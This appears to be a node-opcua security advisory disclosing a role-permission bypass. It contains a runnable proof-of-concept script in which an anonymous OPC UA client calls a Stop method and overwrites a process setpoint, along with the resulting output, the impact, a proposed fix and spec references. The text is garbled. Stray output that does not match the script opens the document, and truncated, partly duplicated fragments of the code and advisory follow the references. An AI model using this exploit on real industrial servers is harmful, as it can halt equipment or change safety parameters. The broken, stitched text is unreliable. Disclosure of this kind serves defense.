[server] EmergencyShutdown EXECUTED by anonymous caller
Mode: VULNERABLE
CALL  EmergencyShutdown : Good (0x00000000)
WRITE ReactorSetpoint   : Good (0x00000000)

Save as packages/node-opcua/poc_c_nodeset_rbac.js, then run node poc_c_nodeset_rbac.js:

const {
    OPCUAServer, OPCUAClient, DataType, AttributeIds, StatusCodes,
    MessageSecurityMode, SecurityPolicy, UserTokenType,
    WellKnownRoles, makePermissionFlag, setNamespaceMetaData, nodesets
} = require("node-opcua");

const PORT = 48412, DI_URI = "http://opcfoundation.org/UA/DI/";
let deviceId, methodId, variableId;

async function startServer() {
    const server = new OPCUAServer({
        port: PORT,
        securityPolicies: [SecurityPolicy.None],
        securityModes: [MessageSecurityMode.None],
        allowAnonymous: true,
        nodeset_filename: [nodesets.standard, nodesets.di]
    });
    await server.initialize();

    const di = server.engine.addressSpace.getNamespace(DI_URI);
    di.setDefaultRolePermissions([
        { roleId: WellKnownRoles.Operator, permissions: makePermissionFlag("Read | Write | Browse | Call") }
    ]);
    try {
        setNamespaceMetaData(di);
        console.log("[server] hardening: metadata bound");
    } catch (e) {
        console.log("[server] hardening FAILED:", e.message);
    }

    const device = di.addObject({ browseName: "Pump01", organizedBy: server.engine.addressSpace.rootFolder.objects });
    deviceId = device.nodeId;

    const m = di.addMethod(device, { browseName: "Stop", inputArguments: [], outputArguments: [] });
    m.bindMethod((_i, _c, cb) => {
        console.log("[server] Stop() EXECUTED by anonymous");
        cb(null, { statusCode: StatusCodes.Good, outputArguments: [] });
    });
    methodId = m.nodeId;

    const v = di.addVariable({
        browseName: "Setpoint",
        componentOf: device,
        dataType: DataType.Double,
        accessLevel: "CurrentRead | CurrentWrite",
        userAccessLevel: "CurrentRead | CurrentWrite",
        value: { dataType: DataType.Double, value: 42 }
    });
    variableId = v.nodeId;

    await server.start();
    return server;
}

async function attack() {
    const client = OPCUAClient.create({ endpointMustExist: false, securityMode: MessageSecurityMode.None, securityPolicy: SecurityPolicy.None });
    await client.connect(`opc.tcp://localhost:${PORT}`);
    const s = await client.createSession({ type: UserTokenType.Anonymous });
    const call = (await s.call({ objectId: deviceId, methodId, inputArguments: [] })).statusCode.toString();
    const write = (await s.write({ nodeId: variableId, attributeId: AttributeIds.Value, value: { value: { dataType: DataType.Double, value: 999 } } })).toString();
    await s.close();
    await client.disconnect();
    console.log("CALL  Stop()   :", call);
    console.log("WRITE Setpoint :", write);
}

(async () => {
    const srv = await startServer();
    try { await attack(); } finally { await srv.shutdown(); }
})().catch(e => { console.error(e); process.exit(1); });

Output:

[server] hardening FAILED: INamespace meta data already exists for http://opcfoundation.org/UA/DI/
[server] Stop() EXECUTED by anonymous
CALL  Stop()   : Good (0x00000000)
WRITE Setpoint : Good (0x00000000)

Impact

  • Write arbitrary values to Variables (CurrentWrite) governed only by namespace-level RBAC, e.g. process setpoints, safety parameters.
  • Call bound Methods. Methods have no AccessLevel second gate; executable defaults to true for bound methods (ua_method_impl.ts).
  • Affects every Node relying on the namespace DefaultRolePermissions inheritance mandated by OPC 10000-3 §5.2.9.
  • Anonymous receives every PermissionFlag because null resolves to allPermissions.
  • Availability impact (A:H, CVSS 9.8) is reachable in any deployment binding a Method whose execution affects availability (shutdown / reboot / role-administration); scored A:N as deployment-specific.

What is NOT affected

Servers that declare no RolePermissions anywhere (case 1): permissive by documented design, not a bypass. Stock Opc.Ua.NodeSet2.xml ships DefaultRolePermissions with no Value and falls in this case.

  • Nodes with explicit per-node RolePermissions (correctly enforced - PoC-A case A).
  • Programmatically-created namespaces where the operator calls both setDefaultRolePermissions() and setNamespaceMetaData() (PoC-B --safe).
  • Variables without CurrentWrite in AccessLevel (the Call vector still applies to Methods).

Proposed Fix

  1. Fail-closed - getPermissionForRole(null) should return PermissionFlag.None, not allPermissions (per §4.8.3 default-deny).
  2. Coherent path - getApplicableRolePermissions() should use node.getRolePermissions(inherited=true), which already reads the namespace field correctly.
  3. API safety - setDefaultRolePermissions() should take effect on enforcement directly, without requiring setNamespaceMetaData() (which throws on nodeset-loaded namespaces).
  4. Hardening - server_engine.ts:947-957 should not unconditionally reset DefaultRolePermissions.

Spec Reference (verified verbatim against the official OPC Foundation reference)

  • OPC 10000-3 §4.8.3 - Evaluating Permissions with Roles: "If the bits corresponding to current operation are set, then the operation can proceed. If they are not set the Server returns Bad_UserAccessDenied." (default-deny, the behaviour Bug 1 inverts). https://reference.opcfoundation.org/Core/Part3/v105/docs/4.8.3
  • OPC 10000-3 §5.2.9 - RolePermissions: "If not specified, the value of DefaultRolePermissions Property from the NamespaceMetadata Object associated with the Node shall be used instead." and "If a Server supports Permissions for a particular Namespace it shall add the DefaultRolePermissions Property to the NamespaceMetadata Object for that Namespace." https://reference.opcfoundation.org/Core/Part3/v105/docs/5.2.9
  • OPC 10000-5 §6.3.13 - NamespaceMetadataType (defines DefaultRolePermissions / DefaultUserRolePermissions as Properties of the NamespaceMetadata Object). https://reference.opcfoundation.org/Core/Part5/v104/docs/6.3.13

References

  • https://github.com/node-opcua/node-opcua/security/advisories/GHSA-xggf-m53x-jc3f
  • https://nvd.nist.gov/vuln/detail/CVE-2026-95860
  • https://github.com/node-opcua/node-opcua/pull/1580
  • https://github.com/node-opcua/node-opcua/commit/0261e873900800983c622e01120f484dc6063698
  • https://github.com/node-opcua/node-opcua/releases/tag/v2.180.0

        { roleId: WellKnownRoles.AuthenticatedUser, permissions: makePermissionFlag("Read | Browse") }

    parentNodeId = device.nodeId;

    OPCUAServer, OPCUAClient, DataType, AttributeIds, StatusCodes,
    MessageSecurityMode, SecurityPolicy, UserTokenType,
    WellKnownRoles, makePermissionFlag, setNamespaceMetaData, nodesets
} = require("node-opcua");

let deviceId, methodId, variableId;

async function startServer() {
    const server = new OPCUAServer({

        securityModes: [MessageSecurityMode.None],

    });

    di.setDefaultRolePermissions([
        { roleId: WellKnownRoles.Operator, permissions: makePermissionFlag("Read | Write | Browse | Call") }
    ]);
    try {
        setNamespaceMetaData(di);
        console.log("[server] hardening: metadata bound");
    } catch (e) {
        console.log("[server] hardening FAILED:", e.message);
    }

    const device = di.addObject({ browseName: "Pump01", organizedBy: server.engine.addressSpace.rootFolder.objects });
    deviceId = device.nodeId;

    const m = di.addMethod(device, { browseName: "Stop", inputArguments: [], outputArguments: [] });
    m.bindMethod((_i, _c, cb) => {
        console.log("[server] Stop() EXECUTED by anonymous");
        cb(null, { statusCode: StatusCodes.Good, outputArguments: [] });
    });
    methodId = m.nodeId;

    const v = di.addVariable({
        browseName: "Setpoint",
        componentOf: device,
        dataType: DataType.Double,
        accessLevel: "CurrentRead | CurrentWrite",

    });

async function attack() {
    const client = OPCUAClient.create({ endpointMustExist: false, securityMode: MessageSecurityMode.None, securityPolicy: SecurityPolicy.None });
    await client.connect(`opc.tcp://localhost:${PORT}`);
    const s = await client.createSession({ type: UserTokenType.Anonymous });
    const call = (await s.call({ objectId: deviceId, methodId, inputArguments: [] })).statusCode.toString();
    const write = (await s.write({ nodeId: variableId, attributeId: AttributeIds.Value, value: { value: { dataType: DataType.Double, value: 999 } } })).toString();
    await s.close();

(async () => {
    const srv = await startServer();
    try { await attack(); } finally { await srv.shutdown(); }
})().catch(e => { console.error(e); process.exit(1); });

Output:

[server] hardening FAILED: INamespace meta data already exists for http://opcfoundation.org/UA/DI/
[server] Stop() EXECUTED by anonymous
CALL  Stop()   : Good (0x00000000)
WRITE Setpoint : Good (0x00000000)

Impact

  • Write arbitrary values to Variables (CurrentWrite) governed only by namespace-level RBAC, e.g. process setpoints, safety parameters.
  • Call bound Methods. Methods have no AccessLevel second gate; executable defaults to true for bound methods (ua_method_impl.ts).
  • Affects every Node relying on the namespace DefaultRolePermissions inheritance mandated by OPC 10000-3 §5.2.9.
  • Anonymous receives every PermissionFlag because null resolves to allPermissions.
  • Availability impact (A:H, CVSS 9.8) is reachable in any deployment binding a Method whose execution affects availability (shutdown / reboot / role-administration); scored A:N as deployment-specific.

What is NOT affected

Servers that declare no RolePermissions anywhere (case 1): permissive by documented design, not a bypass. Stock Opc.Ua.NodeSet2.xml ships DefaultRolePermissions with no Value and falls in this case.

  • Nodes with explicit per-node RolePermissions (correctly enforced - PoC-A case A).
  • Programmatically-created namespaces where the operator calls both setDefaultRolePermissions() and setNamespaceMetaData() (PoC-B --safe).
  • Variables without CurrentWrite in AccessLevel (the Call vector still applies to Methods).

Proposed Fix

  1. Fail-closed - getPermissionForRole(null) should return PermissionFlag.None, not allPermissions (per §4.8.3 default-deny).
  2. Coherent path - getApplicableRolePermissions() should use node.getRolePermissions(inherited=true), which already reads the namespace field correctly.
  3. API safety - setDefaultRolePermissions() should take effect on enforcement directly, without requiring setNamespaceMetaData() (which throws on nodeset-loaded namespaces).
  4. Hardening - server_engine.ts:947-957 should not unconditionally reset DefaultRolePermissions.

Spec Reference (verified verbatim against the official OPC Foundation reference)

  • OPC 10000-3 §4.8.3 - Evaluating Permissions with Roles: "If the bits corresponding to current operation are set, then the operation can proceed. If they are not set the Server returns Bad_UserAccessDenied." (default-deny, the behaviour Bug 1 inverts). https://reference.opcfoundation.org/Core/Part3/v105/docs/4.8.3
  • OPC 10000-3 §5.2.9 - RolePermissions: "If not specified, the value of DefaultRolePermissions Property from the NamespaceMetadata Object associated with the Node shall be used instead." and "If a Server supports Permissions for a particular Namespace it shall add the DefaultRolePermissions Property to the NamespaceMetadata Object for that Namespace." https://reference.opcfoundation.org/Core/Part3/v105/docs/5.2.9
  • OPC 10000-5 §6.3.13 - NamespaceMetadataType (defines DefaultRolePermissions / DefaultUserRolePermissions as Properties of the NamespaceMetadata Object). https://reference.opcfoundation.org/Core/Part5/v104/docs/6.3.13
